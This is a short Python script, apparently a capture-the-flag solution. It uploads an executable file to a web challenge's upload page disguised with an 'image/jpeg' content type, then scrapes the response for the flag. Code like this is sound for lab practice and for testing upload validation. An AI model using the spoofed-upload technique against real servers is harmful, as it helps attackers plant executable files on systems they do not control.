#!/usr/bin/env python3
"""
https://requests.readthedocs.io/en/master/user/quickstart/#post-a-multipart-encoded-file
"""

import argparse
import glob
import os
import requests
import re

URL = os.environ.get('URL')
DATA = {"Upload": "Upload"}
SCRIPT = glob.glob("./**/" + "upload.py", recursive=True)[0]
FILE = {"uploaded": ("upload.py", open(SCRIPT, 'rb'), "image/jpeg")}


def main():
    r = requests.post(URL + "?page=upload", DATA, files=FILE)
    flag = re.search(r"flag[^<]*", r.text)
    if flag:
        print(flag.group(0))
    else:
        print("Found no flags")


if __name__ == "__main__":
    if not URL:
        parser = argparse.ArgumentParser(
            description="Upload an executable file pretending it's an image")
        parser.add_argument("URL", help="URL address of the server")
        args = parser.parse_args()
        URL = args.URL
    main()
